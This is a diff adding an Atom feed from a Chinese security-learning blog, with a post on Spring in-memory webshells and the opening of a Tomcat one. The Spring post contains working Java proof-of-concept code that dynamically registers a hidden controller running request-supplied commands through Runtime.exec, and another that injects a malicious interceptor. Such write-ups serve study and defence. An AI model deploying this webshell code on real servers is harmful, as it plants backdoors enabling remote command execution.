@@ -1,0 +1,3504 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://bloyet.github.io</id>
+    <title>Bloyet&apos;s blog</title>
+    <updated>2025-07-11T06:09:23.155Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://bloyet.github.io"/>
+    <link rel="self" href="https://bloyet.github.io/atom.xml"/>
+    <subtitle>做那个人的战士，和他一起去经历，失败!</subtitle>
+    <logo>https://bloyet.github.io/images/avatar.png</logo>
+    <icon>https://bloyet.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, Bloyet&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[Spring内存🐎]]></title>
+        <id>https://bloyet.github.io/post/spring-nei-cun/</id>
+        <link href="https://bloyet.github.io/post/spring-nei-cun/">
+        </link>
+        <updated>2025-07-11T06:07:39.000Z</updated>
+        <content type="html"><![CDATA[<p>在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧</p>
+<p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=efb755bbe6728e721e5cf06c81e4366a">【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili</a></p>
+<p><a href="https://www.bilibili.com/video/BV1PE411i7CV/?vd_source=efb755bbe6728e721e5cf06c81e4366a">【狂神说Java】SpringBoot最新教程IDEA版通俗易懂_哔哩哔哩_bilibili</a></p>
+<h1 id="spring介绍">Spring介绍</h1>
+<p>Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是IOC(Inversion of Control,控制反转) 和 AOP(AspectOrientedProgramming， 面向切面编程)。</p>
+<p>重点讲解一下核心内容</p>
+<h2 id="ioc">IOC</h2>
+<p>IOC的中文翻译为：控制反转</p>
+<p>核心理念是：把对象的创建和管理权交给框架，而不是程序员手动去创建</p>
+<p>例如：</p>
+<p>不用IOC</p>
+<pre><code class="language-java">UserService userService = new UserServiceImpl(); // 程序员自己new对象
+</code></pre>
+<p>使用IOC</p>
+<p>使用这个注解，我们的框架会在运行的时候自动进行创建</p>
+<pre><code class="language-java">@Autowired
+UserService userService; // 交给 Spring 容器来注入，不用自己new
+</code></pre>
+<h2 id="aop">AOP</h2>
+<p>AOP（Aspect-Oriented Programming）是一种通过预定义的切点（Pointcut）和通知（Advice）将横切关注点（Cross-Cutting Concerns）模块化的编程范式。它允许开发者将与业务逻辑无关但对多个模块都很重要的功能（如日志记录、事务管理、安全控制等）从核心业务逻辑中分离出来，从而提高系统的模块化、可维护性和可重用性</p>
+<p>通俗一点来说，就是 AOP 是一种让你把“每个地方都要写的重复逻辑”（比如日志、安全）集中写一遍，然后自动织入方法执行过程中的技术。</p>
+<h2 id="springmvc">SpringMVC</h2>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752214131469.png" alt="" loading="lazy"></figure>
+<p>客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。 SpringMVC 的核心点就是 <code>DispatchServlet</code></p>
+<h2 id="applicationcontext">ApplicationContext</h2>
+<p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> IoC容器 的实际代表者</p>
+<p>Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。</p>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752214131445.png" alt="" loading="lazy"></figure>
+<p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p>
+<p>DispatchServlet是SpringMVC中的前端控制器，处理所有请求的核心组件，而它创建的是一个Child Context，是一个独立的IOC容器（web层使用）</p>
+<p>还有一个是Root ApplicationContext，它是全局的，责管理项目中非 Web 层的 Bean ，由 ContextLoaderListener 在项目启动时创建，负责加载和管理所有非 Web 层 Bean， 保存到 ServletContext 中供后续子容器共享。</p>
+<p>所有的 child 可以取访问 Root 容器，但是 Root 却不能去访问 Child 中的内容</p>
+<p>当然 是所有的context（不仅仅是Root） 的信息都是会存在ServletContext中的</p>
+<h1 id="controller型内存马">Controller型内存马</h1>
+<p>在 Spring 中，当我们<strong>静态注册一个 Controller</strong> 时，确实会<strong>指定一个类的某个方法</strong>处理特定路由；当请求到达这个路由时，Spring 会自动调用这个方法。这是 Spring MVC 的核心功能之一</p>
+<p>那么动态注册的时候也是一样的道理，只不过是由Spring自动完成，变成了我们手动去注册，当我们动态注册了一个恶意的controller，当我们访问指定路由的时候，就可以自动调用恶意方法，进行命令执行</p>
+<p>那么现在就是来看怎么进行动态注册恶意的controller</p>
+<h2 id="思路">思路：</h2>
+<p>获取当前上下文</p>
+<p>注册恶意Controller</p>
+<p>配置路径映射（其实在动态注册Controller的时候，就会进行映射器的配置）</p>
+<h2 id="获取上下文">获取上下文</h2>
+<p>一共有四种方法可以获取到上下文：</p>
+<h3 id="getcurrentwebapplicationcontext">getCurrentWebApplicationContext</h3>
+<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
+</code></pre>
+<p><strong>getCurrentWebApplicationContext</strong> 获得的是一个 <strong>XmlWebApplicationContext</strong> 实例类型的 <strong>Root WebApplicationContext</strong></p>
+<h3 id="webapplicationcontextutils">WebApplicationContextUtils</h3>
+<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
+</code></pre>
+<p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。</p>
+<h3 id="requestcontextutils">RequestContextUtils</h3>
+<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
+</code></pre>
+<p>通过 <code>ServletRequest</code> 类的实例来获得 <code>Child WebApplicationContext</code>。</p>
+<h3 id="getattribute"><strong>getAttribute</strong></h3>
+<pre><code class="language-java">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+</code></pre>
+<p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext</p>
+<h2 id="注册恶意controller">注册恶意Controller</h2>
+<p>我们要想对Spring Controller 的动态注册，就是对 RequestMappingHandlerMapping注入的过程。</p>
+<p>RequestMappingHandlerMapping是springMVC里面的核心Bean，spring把我们的controller解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。</p>
+<p>RequestMappingHandlerMapping对象本身是spring来管理的，可以通过<strong>ApplicationContext</strong>取到，所以并不需要我们新建</p>
+<p>而在SpringMVC框架下，会有两个ApplicationContext，</p>
+<p>一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。</p>
+<p>另外一个是ApplicationContext是由<strong>org.springframework.web.servlet.DispatcherServlet</strong>完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。</p>
+<p>映射器： 它负责维护 <strong>URL 路径（或其他条件）到处理器（如 Controller 方法）的映射关系</strong>。</p>
+<p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br>
+<code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>
+映射器 ；</p>
+<p>Spring 3.1 开始及以后一般开始使用新的<br>
+<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br>
+映射器来支持@Contoller和@RequestMapping注解。</p>
+<h3 id="registermapping">registerMapping</h3>
+<p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping</p>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752214131485.png" alt="" loading="lazy"></figure>
+<p>在刚刚其实也说了 spring会把controller解析为RequestMappingInfo对象，然后在注册进RequestMappingHandlerMapping，所以我们可以看到在registerMapping方法中的参数，也是RequestMappingInfo类 所以在注册之前我们还需要看一下RequestMappingInfo类</p>
+<p>可以看到 构造方法是有非常多的参数的，但是有用的其实就两个 一共是</p>
+<pre><code class="language-java">private RequestMappingInfo(@Nullable String name, @Nullable PathPatternsRequestCondition pathPatternsCondition, @Nullable PatternsRequestCondition patternsCondition, RequestMethodsRequestCondition methodsCondition, ParamsRequestCondition paramsCondition, HeadersRequestCondition headersCondition, ConsumesRequestCondition consumesCondition, ProducesRequestCondition producesCondition, RequestConditionHolder customCondition, BuilderConfiguration options) {
+    Assert.isTrue(pathPatternsCondition != null || patternsCondition != null, &quot;Neither PathPatterns nor String patterns condition&quot;);
+    this.name = StringUtils.hasText(name) ? name : null;
+    this.pathPatternsCondition = pathPatternsCondition;
+    this.patternsCondition = patternsCondition;
+    this.methodsCondition = methodsCondition;
+    this.paramsCondition = paramsCondition;
+    this.headersCondition = headersCondition;
+    this.consumesCondition = consumesCondition;
+    this.producesCondition = producesCondition;
+    this.customConditionHolder = customCondition;
+    this.options = options;
+    this.hashCode = calculateHashCode(this.pathPatternsCondition, this.patternsCondition, this.methodsCondition, this.paramsCondition, this.headersCondition, this.consumesCondition, this.producesCondition, this.customConditionHolder);
+}
+</code></pre>
+<p>一个是指定controller的路径，也就是我们说的路由（设置好映射关系）</p>
+<p>另外一个是指定请求方式，设置为不限制就好</p>
+<p>registerMapping方法中的第二个参数，其实也就是我们对应的恶意类  第三个参数就是对应的恶意方法</p>
+<p>其实很好理解，RequestMappingInfo类指定我们恶意类的映射关系，使我们访问对应的路由时，就会对应一个类，而在MVC架构中，我们访问一个路由时，会自动调用一个方法的，那么这个方法，就是在这里进行指定的</p>
+<pre><code class="language-java">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例
+RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+Method method = 恶意类的字节码.getDeclaredMethods())[0];
+// 3. 定义访问 controller 的 URL 地址
+PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);
+// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+// 5. 在内存中动态注册 controller
+RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+r.registerMapping(info, Class.forName(&quot;恶意Controller&quot;).newInstance(), method);
+</code></pre>
+<h3 id="registerhandler">registerHandler</h3>
+<p>(版本古老，暂且就不复现了（：）<br>
+参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping<br>
+在其registerHandler()方法中<br>
+<a href="https://yyjccc.github.io/img/3-12/15.png"><img src="https://bloyet.github.io/post-images/1752214131501.png" alt="" loading="lazy"></a><br>
+该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中</p>
+<pre><code>// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance()); // 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. 反射获得 registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class); m1.setAccessible(true); // 4. 将 dynamicController 和 URL 注册到 handlerMap 中 m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);
+</code></pre>
+<h3 id="detecthandlermethods">detectHandlerMethods</h3>
+<p>参考上面的 HandlerMapping 接口继承关系图，针对使用 RequestMappingHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractHandlerMethodMapping<br>
+在其detectHandlerMethods() 方法中</p>
+<pre><code>protected void detectHandlerMethods(Object handler) {    Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();    final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {        public boolean matches(Method method) {            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;        }    });    Iterator var6 = methods.iterator();    while(var6.hasNext()) {        Method method = (Method)var6.next();        T mapping = this.getMappingForMethod(method, userType);        this.registerHandlerMethod(handler, method, mapping);    } }
+</code></pre>
+<p>该方法仅接受handler参数，同样可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 并注册 controller 的实例 bean</p>
+<pre><code>context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;恶意Controller&quot;).newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);
+</code></pre>
+<h2 id="poc">POC</h2>
+<p>我这里就用springboot 2.5.6版本进行复现了</p>
+<p>思路还是很简单的：</p>
+<p>先获取当前的上下文，然后获取RequestMappingHandlerMapping 的实例，然后在反射获取我们写好的恶意类的恶意方法，然后获取并且设置我们想要把恶意类映射到的路径，和请求方法，设置到RequestMappingInfo类中，然后在调用RequestMappingHandlerMapping中的registerMapping方法，完成动态注入</p>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
+import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
+import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
+import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+import java.lang.reflect.Method;
+
+@RestController
+public class shell_controller {
+
+    @RequestMapping(&quot;/exec&quot;)
+    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {
+
+        //获取当前上下文环境
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+
+        //手动注册Controller
+        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
+        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+        Method method = Shell.class.getDeclaredMethod(&quot;shell&quot;);
+        // 3. 定义访问 controller 的 URL 地址
+        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
+        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+        // 5. 在内存中动态注册 controller
+        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+        r.registerMapping(info, new Shell(), method);
+
+    }
+
+    @ResponseBody
+    public class Shell{
+
+        public Shell(){}
+
+        public void shell() throws IOException {
+            //获取request
+            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
+            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+        }
+    }
+
+}
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752214131517.png" alt="" loading="lazy"></figure>
+<p>这里有个问题，在springboot版本大于2.6.0的时候会出现一个报错导致命令执行失败</p>
+<p>解决办法参考：<a href="https://yyjccc.github.io/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">Spring内存马</a></p>
+<h1 id="interceptor型内存马">Interceptor型内存马</h1>
+<h2 id="什么是interceptor">什么是Interceptor</h2>
+<p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p>
+<p>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</p>
+<p>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</p>
+<h2 id="interceptor示例">Interceptor示例</h2>
+<p>在springboot下写了：</p>
+<p>WebConfig</p>
+<pre><code class="language-java">package org.example.spring.Config;
+import org.springframework.context.annotation.Configuration;
+import org.springframework.web.servlet.config.annotation.*;
+
+@Configuration
+public class WebConfig implements WebMvcConfigurer {
+
+    @Override
+    public void addInterceptors(InterceptorRegistry registry) {
+        registry.addInterceptor(new org.example.spring.Interceptor.MyInterceptor())
+                .addPathPatterns(&quot;/**&quot;)       // 拦截所有路径
+                .excludePathPatterns(&quot;/login&quot;); // 排除登录路径
+    }
+}
+</code></pre>
+<p>TestController</p>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+import org.springframework.web.bind.annotation.*;
+
+@RestController
+public class TestController {
+
+    @GetMapping(&quot;/hello&quot;)
+    public String hello() {
+        return &quot;Hello, world!&quot;;
+    }
+
+    @GetMapping(&quot;/login&quot;)
+    public String login() {
+        return &quot;Login page (not intercepted)&quot;;
+    }
+}
+</code></pre>
+<p>MyInterceptor</p>
+<pre><code class="language-java">package org.example.spring.Interceptor;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.springframework.web.servlet.HandlerInterceptor;
+
+public class MyInterceptor implements HandlerInterceptor {
+
+    @Override
+    public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response,
+                             Object handler) throws Exception {
+        System.out.println(&quot;进入拦截器：MyInterceptor -&gt; preHandle&quot;);
+        // 返回 true 继续执行，false 则终止请求链
+        return false;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752214131533.png" alt="" loading="lazy"></figure>
+<p>效果就跟Filter差不多，当访问的路由不是login，就会进入拦截器 如果返回true就继续执行，如果返回为false就中断这次原来对应的处理方法</p>
+<p>断点下在ApplicationFilterChain#internalDoFilter，可以看到和我们之前学的Tomcat很像，但与Tomcat不同的是，当调用到HttpServlet#service时，最终会调用DispatcherServlet#doDispatch进行逻辑处理，这正是Spring的逻辑处理核心类。</p>
+<figure data-type="image" tabindex="6"><img src="https://bloyet.github.io/post-images/1752214131549.png" alt="" loading="lazy"></figure>
+<p>我们就直接来看核心类</p>
+<figure data-type="image" tabindex="7"><img src="https://bloyet.github.io/post-images/1752214131564.png" alt="" loading="lazy"></figure>
+<p>跟进getHandler方法：</p>
+<p>使用增强for语句 遍历handlerMappings来获取HandlerMapping类型的对象</p>
+<pre><code class="language-java">protected HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
+    if (this.handlerMappings != null) {
+        for(HandlerMapping mapping : this.handlerMappings) {
+            HandlerExecutionChain handler = mapping.getHandler(request);
+            if (handler != null) {
+                return handler;
+            }
+        }
+    }
+
+    return null;
+}
+</code></pre>
+<p>实际上还会调用org.springframework.web.servlet.handler.AbstractHandlerMapping 类的 getHandler 方法</p>
+<pre><code class="language-java">public final HandlerExecutionChain getHandler(HttpServletRequest request) throws Exception {
+    Object handler = this.getHandlerInternal(request);
+    if (handler == null) {
+        handler = this.getDefaultHandler();
+    }
+
+    if (handler == null) {
+        return null;
+    } else {
+        if (handler instanceof String) {
+            String handlerName = (String)handler;
+            handler = this.obtainApplicationContext().getBean(handlerName);
+        }
+
+        if (!ServletRequestPathUtils.hasCachedPath(request)) {
+            this.initLookupPath(request);
+        }
+
+        HandlerExecutionChain executionChain = this.getHandlerExecutionChain(handler, request);
+        if (this.logger.isTraceEnabled()) {
+            this.logger.trace(&quot;Mapped to &quot; + handler);
+        } else if (this.logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) {
+            this.logger.debug(&quot;Mapped to &quot; + executionChain.getHandler());
+        }
+
+        if (this.hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) {
+            CorsConfiguration config = this.getCorsConfiguration(handler, request);
+            if (this.getCorsConfigurationSource() != null) {
+                CorsConfiguration globalConfig = this.getCorsConfigurationSource().getCorsConfiguration(request);
+                config = globalConfig != null ? globalConfig.combine(config) : config;
+            }
+
+            if (config != null) {
+                config.validateAllowCredentials();
+            }
+
+            executionChain = this.getCorsHandlerExecutionChain(request, executionChain, config);
+        }
+
+        return executionChain;
+    }
+}
+</code></pre>
+<p>跟进getHandlerExecutionChain方法：</p>
+<p>通过遍历adaptedInterceptors 获取到所有的HandlerInterceptor</p>
+<pre><code class="language-java">protected HandlerExecutionChain getHandlerExecutionChain(Object handler, HttpServletRequest request) {
+    HandlerExecutionChain chain = handler instanceof HandlerExecutionChain ? (HandlerExecutionChain)handler : new HandlerExecutionChain(handler);
+
+    for(HandlerInterceptor interceptor : this.adaptedInterceptors) {
+        if (interceptor instanceof MappedInterceptor) {
+            MappedInterceptor mappedInterceptor = (MappedInterceptor)interceptor;
+            if (mappedInterceptor.matches(request)) {
+                chain.addInterceptor(mappedInterceptor.getInterceptor());
+            }
+        } else {
+            chain.addInterceptor(interceptor);
+        }
+    }
+
+    return chain;
+}
+</code></pre>
+<p>找到了我们自定义的interceptor</p>
+<figure data-type="image" tabindex="8"><img src="https://bloyet.github.io/post-images/1752214131579.png" alt="" loading="lazy"></figure>
+<p>然后在通过chain.addInterceptor 把所有的interceptor添加到HandlerExecutionChain中，然后就结束了，回到</p>
+<p>一开始的DispatcherServlet#doDispatch()中，调用mappedHandler.applyPreHandle方法</p>
+<figure data-type="image" tabindex="9"><img src="https://bloyet.github.io/post-images/1752214131595.png" alt="" loading="lazy"></figure>
+<p>然后遍历调用Interceptor中的preHandle()拦截方法</p>
+<h2 id="实现思路">实现思路</h2>
+<p>获取上下文</p>
+<p>实现一个恶意Interceptor类</p>
+<p>动态注册进内存</p>
+<h3 id="获取上下文-2">获取上下文</h3>
+<p>获取上下文和Controller思路是一样的</p>
+<p>同时，我们通过刚刚的调试可以知道，Interceptor类的信息是存储在adaptedInterceptors中的，所以我们需要反射获取到这个属性并且把恶意类添加进去</p>
+<figure data-type="image" tabindex="10"><img src="https://bloyet.github.io/post-images/1752214131612.png" alt="" loading="lazy"></figure>
+<p>所以我们可以通过获取上下文来 获取到这个对象（Bean）的adaptedInterceptors属性</p>
+<h3 id="实现恶意interceptor类">实现恶意Interceptor类</h3>
+<p>我们需要实现HandlerInterceptor类，重写preHandle方法</p>
+<pre><code class="language-java">public class MyInterceptor implements HandlerInterceptor {
+
+    @Override
+    public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response,
+                             Object handler) throws Exception {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+        // 返回 true 继续执行，false 则终止请求链
+        return false;
+
+    }
+}
+</code></pre>
+<h3 id="动态注入">动态注入</h3>
+<p>adaptedInterceptors其实是一个数组，我们直接用add方法添加我们的恶意类就行，这里要注意的是我们</p>
+<pre><code class="language-java">实际上获取到的是它的实现类org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping
+所以是不能直接通过他来反射获取字段
+AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
+</code></pre>
+<h3 id="poc-2">POC</h3>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.HandlerInterceptor;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+@Controller
+public class shellInterceptor {
+    @RequestMapping(&quot;/shell&quot;)
+    public void shell() throws Exception {
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+        AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
+        System.out.println(handlerMapping.getClass().getName());
+        Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+        field.setAccessible(true);
+        ArrayList list = (ArrayList) field.get(handlerMapping);
+        list.add(new shell_Interceptor());
+
+    }
+
+    public class shell_Interceptor implements HandlerInterceptor {
+
+        @Override
+        public boolean preHandle(HttpServletRequest request,
+                                 HttpServletResponse response,
+                                 Object handler) throws Exception {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+            // 返回 true 继续执行，false 则终止请求链
+            return false;
+
+
+        }
+    }
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Tomcat型内存🐎]]></title>
+        <id>https://bloyet.github.io/post/tomcat-xing-nei-cun/</id>
+        <link href="https://bloyet.github.io/post/tomcat-xing-nei-cun/">
+        </link>
+        <updated>2025-07-11T05:53:05.000Z</updated>
+        <content type="html"><![CDATA[<p>参考文献：</p>
+<p><a href="https://yyjccc.github.io/2024/03/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat内存马</a></p>
+<p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<h1 id="tomcat中的三种context">Tomcat中的三种Context</h1>
+<p>根据Tomcat的三大件servlet、linstener、filter注入内存马，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上</p>
+<p>先导入依赖：</p>
+<pre><code class="language-java">&lt;dependency&gt;
+&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+&lt;version&gt;8.5.31&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="servletcontext">ServletContext</h2>
+<p>在Tomcat架构分析的时候，也提到过这个：</p>
+<p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，可以通过ServletContext来对某个Web应用的资源进行访问和操作</p>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752213966680.png" alt="" loading="lazy"></figure>
+<h2 id="applicationcontext">ApplicationContext</h2>
+<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752213966694.png" alt="" loading="lazy"></figure>
+<p>使用getServletContext()方法其实是获取到了ApplicationContextFacade类，但是其实本质上还是调用了ApplicationContext类中的方法</p>
+<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752213966709.png" alt="" loading="lazy"></figure>
+<h2 id="standardcontext">StandardContext</h2>
+<p>它是context容器的标准实现类，包含了对容器资源的各种操作，ApplicationContext本质上是调用了StandardContext</p>
+<figure data-type="image" tabindex="4"><img src="https://bloyet.github.io/post-images/1752213966724.png" alt="" loading="lazy"></figure>
+<p>一张图来总结其中的关系：</p>
+<figure data-type="image" tabindex="5"><img src="https://bloyet.github.io/post-images/1752213966740.jpeg" alt="" loading="lazy"></figure>
+<h1 id="tomcat内存马">Tomcat内存马</h1>
+<p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。可能有些朋友会发现，这不正是Java Web核心的三大组件嘛！没错，Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
+<p>在这就一步一步的来分析：</p>
+<p>引入Tomcat依赖—这个我在一开始就已经引入了</p>
+<h2 id="listener型">Listener型</h2>
+<p>Listener根据事件可以分为3中ServletContextListener，HttpSessionListener，ServletRequestListener</p>
